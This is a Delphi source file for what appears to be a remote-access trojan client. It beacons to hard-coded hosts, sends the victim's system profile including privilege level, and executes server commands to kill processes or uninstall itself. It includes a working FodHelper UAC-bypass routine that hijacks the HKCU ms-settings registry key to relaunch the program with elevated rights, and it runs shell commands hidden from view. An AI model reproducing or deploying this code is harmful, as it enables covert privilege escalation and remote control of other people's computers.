uses
  System.SysUtils,            { For system-level utilities like date/time formatting }
  System.JSON,                { For working with JSON objects }
  System.Generics.Collections,{ For generic collections like dictionaries }
  System.UITypes,             { For UI types }
  IdTCPClient,                { For TCP client functionalities (communication over network) }
  IdGlobal,                   { For global definitions in Indy components (used by TCP client) }
  Winapi.Windows,             { For Windows API functions (e.g., getting username, Mutex) }
  Winapi.Security,            { For Windows security-related functions (e.g., token elevation) }
  Winapi.ShellAPI,            { For shell-related operations (e.g., executing commands) }
  Winapi.TlHelp32,            { For process snapshot and process enumeration }
  Winapi.WinSvc,      { For service management }
  Registry,            { For registry operations }
  Iphlpapi,            { For network information }
  Winapi.IpTypes,
  System.Types,
  System.Classes,             { For basic Delphi classes like TStream }
  System.IOUtils,             { For file I/O utilities (e.g., TFile.WriteAllText) }
  System.Threading;

type
  // Define a type for the command procedures that will be executed based on the received commands
  TCommandProc = procedure(const Args: TArray<string>; Client: TIdTCPClient);

const
  // Array of host IPs to attempt connections to
  Hosts: array[0..1] of string = ('127.0.0.1', '192.168.1.10'); // Add more if needed
  // Array of ports to try connecting to
  Ports: array[0..1] of Integer = (9000, 9001); // Add more if needed
  // Interval (in milliseconds) between reconnection attempts
  RECONNECT_INTERVAL = 3000; // ms
  // Unique Mutex Name
  MUTEX_NAME = 'Global\MyRemoteAdminClient_SingleInstance';

// ------------------------- LOGGING -------------------------
// LogInfo logs informational messages to the console
procedure LogInfo(const Msg: string);
begin
  Writeln(Format('[%s] [INFO] %s', [FormatDateTime('yyyy-mm-dd hh:nn:ss', Now), Msg]));
end;

// LogSuccess logs success messages to the console
procedure LogSuccess(const Msg: string);
begin
  Writeln(Format('[%s] [SUCCESS] %s', [FormatDateTime('yyyy-mm-dd hh:nn:ss', Now), Msg]));
end;

// LogWarn logs warning messages to the console
procedure LogWarn(const Msg: string);
begin
  Writeln(Format('[%s] [WARN] %s', [FormatDateTime('yyyy-mm-dd hh:nn:ss', Now), Msg]));
end;

// LogError logs error messages to the console
procedure LogError(const Msg: string);
begin
  Writeln(Format('[%s] [ERROR] %s', [FormatDateTime('yyyy-mm-dd hh:nn:ss', Now), Msg]));
end;

// ------------------------- SYSTEM INFO -------------------------
// GetUsername retrieves the currently logged-in user’s name
function GetUsername: string;
var
  Buffer: array[0..255] of WideChar; // Buffer to store the username
  Size: DWORD;                        // Size of the buffer
begin
  Size := Length(Buffer);
  if GetUserNameW(@Buffer[0], Size) then
    Result := PWideChar(@Buffer[0])   // If successful, return the username
  else
    Result := 'Unknown';              // Return 'Unknown' if failed
end;

// GetOSVersion retrieves the operating system version (e.g., Windows 10, Build 19042)
function GetOSVersion: string;
begin
  Result := Format('Windows %d.%d Build %d',
    [TOSVersion.Major, TOSVersion.Minor, TOSVersion.Build]); // Fetches version from the TOSVersion class
end;

// GetCPUName retrieves the name of the CPU from the Windows registry
function GetCPUName: string;
var
  Reg: HKEY;
  Buffer: array[0..255] of WideChar;
  Size, DataType: DWORD;
begin
  Result := 'Unknown'; // Default to 'Unknown' if CPU name can't be fetched
  if RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                   'HARDWARE\DESCRIPTION\System\CentralProcessor\0',
                   0, KEY_READ, Reg) = ERROR_SUCCESS then
  begin
    Size := Length(Buffer) * SizeOf(WideChar);
    if RegQueryValueExW(Reg, PWideChar('ProcessorNameString'),
                        nil, @DataType,
                        PByte(@Buffer[0]), @Size) = ERROR_SUCCESS then
    begin
      Buffer[Size div SizeOf(WideChar) - 1] := #0;  // Null-terminate the string
      Result := PWideChar(@Buffer[0]);                // Return the CPU name
    end;
    RegCloseKey(Reg);  // Always close the registry key
  end;
end;

// GetTotalRAM retrieves the total amount of RAM in the system
function GetTotalRAM: string;
var
  Mem: TMemoryStatusEx;
begin
  Mem.dwLength := SizeOf(Mem); // Prepare the memory status structure
  if GlobalMemoryStatusEx(Mem) then
    Result := Format('%d GB', [Mem.ullTotalPhys div (1024*1024*1024)]) // Convert to GB
  else
    Result := 'Unknown';  // Return 'Unknown' if there is an error
end;

// GetMachineName retrieves the machine's (computer's) name
function GetMachineName: string;
var
  Buffer: array[0..255] of WideChar; // Buffer to store the machine name
  Size: DWORD;                        // Size of the buffer
begin
  Size := Length(Buffer);
  if GetComputerNameW(@Buffer[0], Size) then
    Result := PWideChar(@Buffer[0])   // If successful, return the machine name
  else
    Result := 'Unknown';              // Return 'Unknown' if failed
end;

// GetPrivileges retrieves the privilege level of the current user (User or Admin)
function GetPrivileges: string;
var
  hToken, hProcess: THandle;
  pTokenInformation: Pointer;
  ReturnLength: DWORD;
  TokenInformation: TTokenElevation;
begin
  Result := 'User';  // Default to 'User' if privilege level can't be determined
  hProcess := GetCurrentProcess;
  try
    // Open the process token to query its properties
    if OpenProcessToken(hProcess, TOKEN_QUERY, hToken) then
    begin
      try
        FillChar(TokenInformation, SizeOf(TokenInformation), 0);
        pTokenInformation := @TokenInformation;

        // Query token elevation information
        if GetTokenInformation(hToken, TokenElevation, pTokenInformation, SizeOf(TokenInformation), ReturnLength) then
        begin
          if TokenInformation.TokenIsElevated <> 0 then
            Result := 'Admin';  // If the token is elevated, return 'Admin'
        end;
      finally
        CloseHandle(hToken);  // Close the token handle to free resources
      end;
    end;
  except
    Result := 'User';  // If any error occurs, assume the user is a regular user
  end;
end;

// GetDiskInfo retrieves information about disk drives
function GetDiskInfo: string;
var
  I: Integer;
  DrivePath: string;
  FreeAvailable, TotalSpace, TotalFree: Int64;
  FreePercent: Double;
  JSON: TJSONArray;
  BitMask: Cardinal;
  DriveObj: TJSONObject; // Helper object to build the JSON correctly
begin
  Result := '';
  JSON := TJSONArray.Create;
  try
    BitMask := GetLogicalDrives; // Use Windows API directly
    for I := 0 to 25 do // Loop A-Z
    begin
      if (BitMask and (1 shl I)) > 0 then
      begin
        DrivePath := Chr(I + 65) + ':\';
        if TDirectory.Exists(DrivePath) then
        begin
          // Use GetDiskFreeSpaceEx API (requires Winapi.Windows in uses)
          // Note: GetDiskFreeSpaceEx returns bytes available to the user, total bytes, and total free bytes.
          if GetDiskFreeSpaceEx(PChar(DrivePath), FreeAvailable, TotalSpace, @TotalFree) then
          begin
            if TotalSpace > 0 then
              FreePercent := (FreeAvailable / TotalSpace) * 100
            else
              FreePercent := 0;

            // 1. Create the specific object for this drive
            DriveObj := TJSONObject.Create;

            // 2. Add pairs to the drive object
            DriveObj.AddPair('drive', Chr(I + 65));
            DriveObj.AddPair('free', Format('%.2f GB', [FreeAvailable / (1024 * 1024 * 1024)]));
            DriveObj.AddPair('total', Format('%.2f GB', [TotalSpace / (1024 * 1024 * 1024)]));
            DriveObj.AddPair('free_percent', Format('%.2f', [FreePercent]));

            // 3. Add the populated object to the array
            JSON.Add(DriveObj);
          end;
        end;
      end;
    end;
    Result := JSON.ToString;
    TFile.WriteAllText(ExtractFilePath(ParamStr(0)) + 'disk_info.json', Result);
  finally
    JSON.Free;
  end;
end;

// GetRunningProcesses retrieves information about running processes
function GetRunningProcesses: string;
var
  hSnapshot: THandle;
  pEntry: TProcessEntry32;
  JSON: TJSONArray;
  ProcObj: TJSONObject;
  CurrentPID: DWORD;
begin
  Result := '';
  JSON := TJSONArray.Create;
  try
    // Get the current process ID (Self PID) to identify the client
    CurrentPID := GetCurrentProcessId;

    hSnapshot := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if hSnapshot <> INVALID_HANDLE_VALUE then
    begin
      try
        pEntry.dwSize := SizeOf(TProcessEntry32);
        if Process32First(hSnapshot, pEntry) then
        begin
          repeat
            ProcObj := TJSONObject.Create;
            ProcObj.AddPair('process', pEntry.szExeFile);
            // Add PID (Process ID)
            ProcObj.AddPair('pid', TJSONNumber.Create(pEntry.th32ProcessID));

            // Add Self flag
            if pEntry.th32ProcessID = CurrentPID then
              ProcObj.AddPair('isSelf', TJSONBool.Create(True))
            else
              ProcObj.AddPair('isSelf', TJSONBool.Create(False));

            JSON.Add(ProcObj);
          until not Process32Next(hSnapshot, pEntry);
        end;
      finally
        CloseHandle(hSnapshot);
      end;
    end;
    Result := JSON.ToString;
    TFile.WriteAllText(ExtractFilePath(ParamStr(0)) + 'Processes_info.json', Result);
  finally
    JSON.Free;
  end;
end;

// KillProcessCommand terminates a process by PID
procedure KillProcessCommand(const Args: TArray<string>; Client: TIdTCPClient);
var
  PID: Integer;
  hProcess: THandle;
  Success: Boolean;
begin
  if Length(Args) < 1 then Exit;
  try
    PID := StrToInt(Args[0]);
    LogInfo(Format('Attempting to kill process PID: %d', [PID]));
    Success := False;

    hProcess := OpenProcess(PROCESS_TERMINATE, False, PID);
    if hProcess <> 0 then
    begin
      if TerminateProcess(hProcess, 0) then
      begin
        Success := True;
        LogSuccess('Process terminated successfully.');
      end
      else
        LogError('Failed to terminate process (Access Denied).');
      CloseHandle(hProcess);
    end
    else
      LogError('Failed to open process (Not found).');

    // Send response back to Server
    if Client.Connected then
    begin
      if Success then
        Client.IOHandler.WriteLn('OUT|{"status":"success", "message":"Process ' + IntToStr(PID) + ' terminated."}')
      else
        Client.IOHandler.WriteLn('OUT|{"status":"error", "message":"Failed to kill process ' + IntToStr(PID) + '"}');
    end;

  except
    on E: Exception do
    begin
      LogError('Error killing process: ' + E.Message);
      if Client.Connected then
        Client.IOHandler.WriteLn('OUT|{"status":"error", "message":"' + E.Message + '"}');
    end;
  end;
end;

function Wow64DisableWow64FsRedirection(var OldValue: Pointer): BOOL; stdcall; external kernel32 name 'Wow64DisableWow64FsRedirection';
function Wow64RevertWow64FsRedirection(OldValue: Pointer): BOOL; stdcall; external kernel32 name 'Wow64RevertWow64FsRedirection';

// ADD this new command procedure with cleanup
procedure FodHelperCommand(const Args: TArray<string>; Client: TIdTCPClient);
var
  Reg: TRegistry;
  KeyPath: string;
  CmdToExecute: string;
  CurrentExePath: string;
  PID: string;
  OldWow64State: Pointer;
begin
  LogInfo('Executing FodHelper UAC Bypass...');

  // 1. Get current process path and PID
  CurrentExePath := ParamStr(0);
  PID := IntToStr(GetCurrentProcessId);

  // 2. Construct the command
  // Logic:
  // 1. taskkill /f /pid <PID> (Kill current non-elevated process)
  // 2. reg delete "HKCU\Software\Classes\ms-settings" /f (Clean up registry keys)
  // 3. "<ExePath>" (Start the client elevated)
  CmdToExecute := Format('cmd /c taskkill /f /pid %s & reg delete "HKCU\Software\Classes\ms-settings" /f & "%s"',
    [PID, CurrentExePath]);

  // 3. Disable File System Redirection (64-bit fodhelper.exe)
  if not Wow64DisableWow64FsRedirection(OldWow64State) then
    LogWarn('Failed to disable FS redirection. May fail if OS is 64-bit.');

  try
    // 4. Registry Manipulation (64-bit view)
    Reg := TRegistry.Create(KEY_WRITE or KEY_WOW64_64KEY);
    try
      Reg.RootKey := HKEY_CURRENT_USER;
      KeyPath := 'Software\Classes\ms-settings\Shell\Open\command';

      // Create/Open the key
      if Reg.OpenKey(KeyPath, True) then
      begin
        try
          // Set DelegateExecute to empty
          Reg.WriteString('DelegateExecute', '');

          // Set default value to our command
          Reg.WriteString('', CmdToExecute);

          LogSuccess('Registry keys set successfully in 64-bit view.');
        finally
          Reg.CloseKey;
        end;
      end
      else
      begin
        LogError('Failed to open registry key.');
        Exit;
      end;
    finally
      Reg.Free;
    end;

    // 5. Execute FodHelper.exe
    ShellExecute(0, 'open', 'C:\Windows\System32\fodhelper.exe', nil, nil, SW_HIDE);
    LogSuccess('FodHelper.exe executed. Awaiting elevation...');

    Sleep(1000);

  finally
    // 6. Re-enable File System Redirection
    Wow64RevertWow64FsRedirection(OldWow64State);
  end;
end;


// ------------------------- COMMANDS -------------------------
procedure CloseClient(const Args: TArray<string>; Client: TIdTCPClient);
begin
  LogInfo('Executing Close...');
  Halt;
end;

procedure RestartClient(const Args: TArray<string>; Client: TIdTCPClient);
var
  Cmd: string;
begin
  LogInfo('Scheduling Restart...');
  Cmd := Format('/C ping 127.0.0.1 -n 1 >nul & "%s"', [ParamStr(0)]);
  ShellExecute(0, 'open', 'cmd.exe', PChar(Cmd), nil, SW_HIDE);
  Halt;
end;

procedure UninstallClient(const Args: TArray<string>; Client: TIdTCPClient);
var
  Cmd: string;
begin
  LogInfo('Scheduling Uninstall...');
  Cmd := Format('/C ping 127.0.0.1 -n 1 >nul & del "%s"', [ParamStr(0)]);
  ShellExecute(0, 'open', 'cmd.exe', PChar(Cmd), nil, SW_HIDE);
  Halt;
end;

procedure GetDiskInfoCommand(const Args: TArray<string>; Client: TIdTCPClient);
var
  DiskJSON: string;
begin
  DiskJSON := GetDiskInfo;
  if Client.Connected then
    Client.IOHandler.WriteLn('OUT|' + DiskJSON);
end;

procedure GetRunningProcessesCommand(const Args: TArray<string>; Client: TIdTCPClient);
var
  ProcessesJSON: string;
begin
  ProcessesJSON := GetRunningProcesses;
  if Client.Connected then
    Client.IOHandler.WriteLn('OUT|' + ProcessesJSON);
end;

// BuildJSON creates a JSON object containing system information and returns it as a string
function BuildJSON: string;
var
  Obj: TJSONObject;
  DiskObj: TJSONObject;
begin
  Obj := TJSONObject.Create;
  try
    Obj.AddPair('machine', GetMachineName);
    Obj.AddPair('username', GetUsername);
    Obj.AddPair('privileges', GetPrivileges);
    Obj.AddPair('os', GetOSVersion);
    Obj.AddPair('cpu', GetCPUName);
    Obj.AddPair('ram', GetTotalRAM);

    DiskObj := TJSONObject.Create;
    DiskObj.AddPair('disk_info', GetDiskInfo);
    Obj.AddPair('disk', DiskObj);

    Result := Obj.ToJSON;

    try
      TFile.WriteAllText(ExtractFilePath(ParamStr(0)) + 'system_info.json', Result);
      LogSuccess('System info written to system_info.json');
    except
      on E: Exception do
        LogError('Error writing JSON to disk: ' + E.Message);
    end;
  finally
    Obj.Free;
  end;
end;

// ------------------------- CONNECTION HANDLER -------------------------
procedure ConnectAndRun;
var
  Client: TIdTCPClient;
  Commands: TDictionary<string, TCommandProc>;
  Line: string;
  Parts: TArray<string>;
  CmdName: string;
  Args: TArray<string>;
  Connected: Boolean;
begin
  Commands := TDictionary<string, TCommandProc>.Create;
  try
    Commands.Add('FodHelper', FodHelperCommand);
    Commands.Add('Close', CloseClient);
    Commands.Add('Restart', RestartClient);
    Commands.Add('Uninstall', UninstallClient);
    Commands.Add('GetDiskInfo', GetDiskInfoCommand);
    Commands.Add('GetRunningProcesses', GetRunningProcessesCommand);
    Commands.Add('KillProcess', KillProcessCommand);

    Client := TIdTCPClient.Create(nil);
    try
      Client.ConnectTimeout := 3000;
      Connected := False;

      // 1. Attempt Connection Loop
      while not Connected do
      begin
        for var p := Low(Ports) to High(Ports) do
        begin
          for var h := Low(Hosts) to High(Hosts) do
          begin
            try
              Client.Host := Hosts[h];
              Client.Port := Ports[p];
              LogInfo(Format('Attempting connection to %s:%d...', [Hosts[h], Ports[p]]));
              Client.Connect;

              if Client.Connected then
              begin
                Client.IOHandler.DefStringEncoding := IndyTextEncoding_UTF8;
                Connected := True;
                LogSuccess(Format('Connected to %s:%d', [Hosts[h], Ports[p]]));
                Break;
              end;
            except
              on E: Exception do
                LogWarn(Format('Failed to connect to %s:%d - %s', [Hosts[h], Ports[p], E.Message]));
            end;
          end;
          if Connected then Break;
        end;

        if not Connected then
        begin
          LogWarn('All hosts/ports failed. Retrying in 5 seconds...');
          Sleep(RECONNECT_INTERVAL);
        end;
      end;

      // 2. Send Initial Info
      if Client.Connected then
      begin
        Client.IOHandler.WriteLn('INFO|' + BuildJSON);
        LogSuccess('System info sent.');
      end;

      // 3. Command Processing Loop
      while Client.Connected do
      begin
        try
          Line := Client.IOHandler.ReadLn;
          if Line = '' then Continue;

          Parts := Line.Split([' '], 2);
          CmdName := Parts[0];
          if Length(Parts) > 1 then
            Args := Parts[1].Split([' '])
          else
            Args := [];

          if Commands.ContainsKey(CmdName) then
            Commands[CmdName](Args, Client)
          else
            LogWarn('Unknown command: ' + CmdName);

        except
          on E: Exception do
          begin
            LogError('Disconnected or read error: ' + E.Message);
            Client.Disconnect;
            Break;
          end;
        end;
      end;

    finally
      Client.Free;
    end;
  finally
    Commands.Free;
  end;
end;

// ------------------------- MAIN -------------------------
var
  MutexHandle: THandle;
begin
  // 1. Check for Single Instance (Mutex)
  MutexHandle := CreateMutex(nil, False, MUTEX_NAME);

  // ERROR_ALREADY_EXISTS means another instance is running
  if (MutexHandle = 0) or (GetLastError = ERROR_ALREADY_EXISTS) then
  begin
    // Exit silently or log to a file if needed
    Exit;
  end;

  try
    // Main loop to keep the application running and retrying connection
    while True do
    begin
      try
        ConnectAndRun;
      except
        on E: Exception do
        begin
          LogError('Fatal error: ' + E.Message + '. Retrying in 5 seconds...');
          Sleep(RECONNECT_INTERVAL);
        end;
      end;
    end;
  finally
    // Clean up the Mutex when the program finally exits
    if MutexHandle <> 0 then
      CloseHandle(MutexHandle);
  end;
end.
